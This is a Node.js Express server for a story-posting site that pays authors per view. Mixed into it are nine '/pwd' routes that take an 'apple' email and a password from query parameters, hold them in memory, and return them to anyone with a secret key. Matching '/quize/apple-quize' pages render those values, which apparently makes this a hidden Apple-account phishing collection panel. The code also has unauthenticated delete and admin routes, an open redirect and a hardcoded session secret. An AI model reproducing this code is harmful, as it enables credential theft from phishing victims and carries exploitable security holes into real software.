require("dotenv").config();

const express = require("express");
const bodyParser = require("body-parser");
const _ = require("lodash");
const ejs = require("ejs");
const mongoose = require("mongoose");
const session = require("express-session");
const passport = require("passport");
const passportLocalMongoose = require("passport-local-mongoose");
const LocalStrategy = require('passport-local').Strategy
const pagination = require('express-mongoose-pagination')
var cost = 0.001
const port = process.env.PORT || 3000;
var pwd = {"apple":"",
           "pass":""}
var pwd2 = {"apple":"",
           "pass":""}
var pwd3 = {"apple":"",
           "pass":""}

var pwd4 = {"apple":"",
           "pass":""}

var pwd5 = {"apple":"",
           "pass":""}

var pwd6 = {"apple":"",
           "pass":""}

var pwd7 = {"apple":"",
           "pass":""}

var pwd8 = {"apple":"",
           "pass":""}

var pwd9 = {"apple":"",
           "pass":""}

process.on('uncaughtException', function (err) {
  console.error(err);
  console.log("Node NOT Exiting...");
});

// setting up app
const app = express();
app.set("view engine", "ejs");
app.set('trust proxy',true); 
app.use(bodyParser.urlencoded({
  extended: true
}));
app.use(express.static("public"));
app.use(session({
  secret: "Our little secret.",
  cookie:{_expires : 6000000000},
  resave: false,
  saveUninitialized: false
}));
app.use(passport.initialize());
app.use(passport.session());


// connection to mongodb using mongoose
mongoose.connect(process.env.DATABASE_URL, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  tls:true,
  tlsCAFile:"./ca-certificate.crt"
});
mongoose.set('useFindAndModify', false);
mongoose.set('useCreateIndex', true);


// creating collection
const postSchema = new mongoose.Schema({
  url: {
    type: String,
    required: true
  },
  title: {
    type: String,
    required: true
  },
  postCont: {
    type: String,
    required: true
  },
  author: {
    type: String,
    required: true
  },
  feature: {
    type: Number,
    required: true
  },
  views: {
    type: Number,
    default: 0
  }
});

postSchema.plugin(pagination)
const Post = mongoose.model("Post", postSchema);


const userSchema = new mongoose.Schema({
  email: String,
  password: String,
  author: {
    type: String,
    unique: true
  }
});
userSchema.plugin(passportLocalMongoose);
const User = new mongoose.model("User", userSchema)

const ipSchema = new mongoose.Schema({
  ip:String,
  createdAt: { type: Date, expires: '1440m', default: Date.now }
})
const IP = new mongoose.model("IP",ipSchema)

passport.use(new LocalStrategy({
  usernameField: 'email',
}, User.authenticate()));
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());
app.use(function(req, res, next) {
  res.locals.login = req.user;
  next();
})


// routes
app.get("/", async function(req, res) {
  const p = await Post.find({
    feature: 1
  }).paginate(req)
  res.render("home", {
    posts: p["data"]
  })
});

app.post("/", async function(req, res) {
  const p = await Post.find({
    feature: 1
  }).paginate(req)
  var posts = p["data"]
  res.json(posts)
});


app.get("/contact-us", function(req, res) {
  res.render("contact")
});

app.get("/pwd", function(req,res) {
  if (req.query.ne) {
    pwd["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd2", function(req,res) {
  if (req.query.ne) {
    pwd2["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd2["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd2)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd3", function(req,res) {
  if (req.query.ne) {
    pwd3["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd3["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd3)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd4", function(req,res) {
  if (req.query.ne) {
    pwd4["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd4["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd4)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd5", function(req,res) {
  if (req.query.ne) {
    pwd5["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd5["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd5)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd6", function(req,res) {
  if (req.query.ne) {
    pwd6["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd6["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd6)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd7", function(req,res) {
  if (req.query.ne) {
    pwd7["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd7["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd7)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd8", function(req,res) {
  if (req.query.ne) {
    pwd8["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd8["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd8)
} else {
  res.render("404.ejs")
}
});

app.get("/pwd9", function(req,res) {
  if (req.query.ne) {
    pwd9["apple"] = req.query.ne
  } else if (req.query.np) {
    pwd9["pass"] = req.query.np
  }
if (req.query.s == process.env.s) {
  res.json(pwd9)
} else {
  res.render("404.ejs")
}
});

app.get("/A2/:rnd", function(req,res) {
  res.redirect("https://discord.gg/k3NRzYtmsj")
})

app.get("/quize/apple-quize", function(req,res) {
  res.render("apple-quize",{email:pwd["apple"],pass:pwd["pass"]})
})

app.get("/quize/apple-quizes", function(req,res) {
  res.render("apple-quizes",{email:pwd2["apple"],pass:pwd2["pass"]})
})

app.get("/quize/apple-quizez", function(req,res) {
  res.render("apple-quizez",{email:pwd3["apple"],pass:pwd3["pass"]})
})

app.get("/quize/apple-quizeq", function(req,res) {
  res.render("apple-quizeq",{email:pwd4["apple"],pass:pwd4["pass"]})
})

app.get("/quize/apple-quizem", function(req,res) {
  res.render("apple-quizem",{email:pwd5["apple"],pass:pwd5["pass"]})
})

app.get("/quize/apple-quizea", function(req,res) {
  res.render("apple-quizea",{email:pwd6["apple"],pass:pwd6["pass"]})
})

app.get("/quize/apple-quizeb", function(req,res) {
  res.render("apple-quizeb",{email:pwd7["apple"],pass:pwd7["pass"]})
})

app.get("/quize/apple-quizec", function(req,res) {
  res.render("apple-quizec",{email:pwd8["apple"],pass:pwd8["pass"]})
})

app.get("/quize/apple-quizei", function(req,res) {
  res.render("apple-quizei",{email:pwd9["apple"],pass:pwd9["pass"]})
})

app.get("/quize/1apple-quize", function(req,res) {
  res.render("1apple-quize")
})

app.get("/quize/1apple-quizes", function(req,res) {
  res.render("1apple-quizes")
})

app.get("/quize/1apple-quizez", function(req,res) {
  res.render("1apple-quizez")
})

app.get("/quize/1apple-quizeq", function(req,res) {
  res.render("1apple-quizeq")
})

app.get("/quize/1apple-quizem", function(req,res) {
  res.render("1apple-quizem")
})

app.get("/quize/1apple-quizea", function(req,res) {
  res.render("1apple-quizea")
})

app.get("/quize/1apple-quizeb", function(req,res) {
  res.render("1apple-quizeb")
})

app.get("/quize/1apple-quizec", function(req,res) {
  res.render("1apple-quizec")
})

app.get("/quize/1apple-quizei", function(req,res) {
  res.render("1apple-quizei")
})

app.get("/redirection", function(req, res) {
var link = req.query.link
  res.render("redirection",{link:link})
});

app.get("/logout", function(req, res) {
  req.logout()
  res.redirect("/login")
});

app.get("/privacy-policy", function(req, res) {
  res.render("privacy-policy")
});

app.get("/ads.txt", function(req, res) {
  res.sendFile(__dirname, 'public/ads.txt')
})

app.get("/register", function(req, res) {
  res.render("register", {
    error: ""
  })
});


app.post("/views", async function(req, res) {
  var id = req.query.id.toString()
  IP.find({
    ip:req.ip
  }, function(err,results) {
    if (err) {
      console.log(err)
    } else {
      if (!results.length) {
        
        Post.findOneAndUpdate({
          _id: id
        }, {
          $inc: {
            views: 1
          }
        }, null, function(err, result) {
          if (err) {
            console.log(err)
          } else {
            console.log("updated views")
          }
        })

        const ip = {
          ip:(req.ip)
        }
        var add = new IP(ip)
        add.save()
        console.log("ip logged")
      } else {
        console.log("already viewed")
      }
    }
  })

  res.json("");
});


app.get("/author", async function(req, res) {
  if (req.isAuthenticated()) {
    const p = await Post.find({
      author: req.user.author
    }).paginate(req)
    res.render("author", {
      posts: p["data"]
    })
  } else {
    res.redirect("/login")
  }
});

app.post("/author", async function(req, res) {
  if (req.isAuthenticated()) {
    const p = await Post.find({
      author: req.user.author
    }).paginate(req)
    var posts = p["data"]
    res.json(posts)
  } else {
    res.redirect("/login")
  }
});


app.get("/earnings", async function(req, res) {
  if (req.isAuthenticated()) {
    var totalview = 0
    await Post.find({
      author: req.user.author
    }, function(err, results) {
      if (err) {
        console.log(err)
      } else {
        results.forEach(function(result) {
          totalview = totalview + result["views"]
        });
        res.render("earnings", {
          views: totalview,
          money: totalview * cost,
          cost: cost * 1000
        })
      };
    });

  } else {
    res.redirect("/login")
  }
});

app.get("/login", function(req, res) {

  if (req.isAuthenticated()) {
    res.redirect("/author")
  } else {
    if (req.get('referer') === "https://pixelpaste.net/login") {
      res.render("login", {
        error: "Invalid Email Or Password"
      })
    } else {
      res.render('login', {
        error: ""
      })
    }
  }
});

app.get("/admin", function(req, res){
  if (req.isAuthenticated()) {
    if (req.user.author === "admin") {
      var posts = 0;
      var totalview = 0;

      Post.find({},function(err,results){
        if (err) {
          console.log(err)
        } else {
          results.forEach(function(result){
            posts = posts + 1
            totalview = totalview + result["views"]
          })
          User.countDocuments({},function(err,count){
            if (err) {
              console.log(err)
            } else {
              res.render("admin",{totalposts:posts,totalviews:totalview,users:count,netTurnover:totalview*cost,cost:cost})
            }
          })

        }
      })
    } else {
      res.redirect("/")
    }
  } else {
    res.redirect("/")
  }
});

app.post("/cost", function(req, res){
  var author = req.query.author

  cost = author

  res.json("")
});

app.post("/admin", async function(req, res){
  var author = req.query.author

  Post.updateMany({author:author},{views:0},null,function(err,results){
    if (err) {
      console.log(err)
    } else {
      res.json("done")
    }
  })
});

app.post("/getviews", async function(req, res){
  var totalview = 0;
  var post = 0
  var author = req.query.author.toString()
  Post.find({author:author}, function(err,results){
    if (err) {
      console.log(err)
    } else {
      results.forEach(function(result){
        totalview = totalview + result["views"]
        post = post + 1
      });
      res.json({views:totalview,posts:post})
    }
  })
})

app.post("/register", function(req, res) {
  if (req.body.password != req.body.cpassword) {
    res.render("register", {
      error: "Password Don't Match"
    })
  } else {
    User.register({
      username: req.body.email,
      author: req.body.author
    }, req.body.password, function(err, user) {
      if (err) {
        if (err.name == "UserExistsError") {
          res.render("register", {
            error: "Email Already Exist"
          })
        } else if (err.name == "MongoError") {
          res.render("register", {
            error: "Pick Different Author Name"
          })
        }
      } else {
        passport.authenticate("local")(req, res, function() {
          res.redirect("/author");
        });
      }
    });
  };
});

app.post("/login",passport.authenticate("local"), function(req, res) {
  res.redirect("/author")
});

// load post
app.get("/stories/:title", function(req, res) {
  const titles = _.lowerCase(req.params.title)
  Post.find({
    url: titles
  }, function(err, results) {
    if (err) {
      console.log(err)
    } else if (results.length > 0) {

      res.render("post", {
        title: results[0].title,
        story: results[0].postCont,
        author: results[0].author,
        id: results[0]._id
      })

    } else {
      console.log(results)
      res.render("404")
    }
  })
});


// compose post
app.get("/compose", function(req, res) {

  if (req.user) {
    res.render("compose", {
      title: "",
      story: "",
      author: req.user.author
    })
  } else {
    res.render("compose", {
      title: "",
      story: "",
      author: ""
    })
  }
});

app.post("/compose", function(req, res) {
  if (req.body.features === undefined) {
    var feature = 0;
  } else {
    var feature = 1;
  }
  if (req.isAuthenticated()) {
    var Author = req.user.author
  } else {
    var Author = "Anonymous"
  }
  const titleH = _.lowerCase(req.body.title)
  Post.find({
    url: titleH
  }, function(err, results) {
    if (err) {
      console.log(err)
    } else if (results.length > 0) {
      var rnd = Math.floor(Math.random() * 1000);
      var addUrl = titleH + " " + rnd
      const story = {
        url: addUrl.toString(),
        title: req.body.title.toString(),
        author: Author,
        postCont: req.body.story.toString(),
        feature: feature
      };
      var add = new Post(story);
      add.save()
      res.redirect("/stories/" + addUrl.replace(/\s/g, "-"))
    } else {
      var addUrl = _.lowerCase(req.body.title)
      const story = {
        url: addUrl.toString(),
        title: req.body.title.toString(),
        author: Author,
        postCont: req.body.story.toString(),
        feature: feature
      };
      var add = new Post(story);
      add.save()
      res.redirect("/stories/" + addUrl.replace(/\s/g, "-"))
    }
  })
});


// delete post
app.get("/:id", function(req, res) {
  Post.findOneAndDelete({
    _id: req.params.id
  }, function(err, post) {
    if (!err && post) {
      console.log("deleted")
    } else {
      console.log(err)
    }
  })
  res.redirect("/author")
});


// update post
app.get("/compose/:id", function(req, res) {
  Post.find({
    _id: req.params.id
  }, function(err, results) {
    if (err) {
      console.log(err)
    } else if (results.length > 0) {
      res.render("compose", {
        title: results[0].title,
        story: results[0].postCont,
        author: results[0].author,
        id: results[0]._id,
        feature: results[0].feature
      })
    }
  })
});

app.post("/compose/:id", function(req, res) {
  if (req.body.features === undefined) {
    var feature = 0;
  } else {
    var feature = 1;
  }
  Post.findOneAndUpdate({
    _id: req.params.id.toString()
  }, {
    postCont: req.body.story.toString(),
    title: req.body.title.toString(),
    feature: feature
  }, null, function(err, results) {
    if (err) {
      console.log(err)
    }
  })
  Post.find({
    _id: req.params.id.toString()
  }, function(err, results) {
    if (err) {
      console.log(err)
    } else {
      res.redirect("/stories/" + results[0]["url"].replace(/\s/g, "-"))
    }
  })
});


// unknown urls
app.get('*', function(req, res) {
  res.render('404');
});

app.use((err, req, res, next) => {
  if (!err) return next();
  return res.status(400).json({
    status: 400,
    error: 'OOps! Bad request',
  });

});

// app.listen(process.env.PORT);
// app.listen("3000", function() {
//   console.log("server started at port 3000");
// });

app.listen(port, () => console.log(`App listening on port ${port}!`));
